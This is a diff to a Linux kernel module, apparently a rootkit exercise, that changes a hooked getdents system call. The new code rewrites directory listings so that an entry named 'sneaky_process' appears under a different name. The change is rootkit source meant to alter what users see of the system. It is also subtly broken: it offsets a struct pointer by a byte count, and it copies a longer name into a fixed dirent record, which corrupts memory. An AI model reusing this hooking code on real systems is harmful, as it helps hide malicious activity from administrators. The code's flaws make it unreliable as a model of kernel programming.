@@ -89,7 +89,42 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                     unsigned int count)
 {
   printk(KERN_INFO "Getdents: Very, very Sneaky!\n");
-  return original_call_getdents(fd,dirp,count);
+  
+
+  int nread, bpos; 
+  //char buf[BUF_SIZE];
+  struct linux_dirent *d;
+  char d_type;
+
+
+  nread= original_call_getdents(fd,dirp,count);
+
+  const char* sneakyName="sneaky_process"; 
+
+  for (bpos = 0; bpos < nread;) 
+  {
+    d = (struct linux_dirent *) (dirp + bpos);
+
+
+    if (strcmp(d->d_name,sneakyName)==0)
+      strcpy(d->d_name , "sneaky obfuscated");
+
+    // printf("%8ld  ", d->d_ino);
+    // d_type = *(buf + bpos + d->d_reclen - 1);
+    // printf("%-10s ", (d_type == DT_REG) ?  "regular" :
+    //                 (d_type == DT_DIR) ?  "directory" :
+    //                 (d_type == DT_FIFO) ? "FIFO" :
+    //                 (d_type == DT_SOCK) ? "socket" :
+    //                 (d_type == DT_LNK) ?  "symlink" :
+    //                 (d_type == DT_BLK) ?  "block dev" :
+    //                 (d_type == DT_CHR) ?  "char dev" : "???");
+    // printf("%4d %10lld  %s\n", d->d_reclen,
+    //        (long long) d->d_off, d->d_name);
+    bpos += d->d_reclen;
+   }
+
+
+  return nread; 
 }
 
 ////////////////////////////////////////////////////////////////////////
